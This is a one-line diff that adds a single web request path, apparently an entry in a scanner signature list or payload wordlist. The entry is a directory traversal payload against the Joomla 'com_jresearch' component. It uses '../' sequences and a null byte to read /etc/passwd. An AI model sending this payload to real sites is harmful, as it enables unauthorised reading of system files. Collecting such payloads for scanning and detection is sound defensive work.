@@ -1,0 +1,1 @@
+/index.php?option=com_jresearch&controller=../../../../../../../../etc/passwd%00
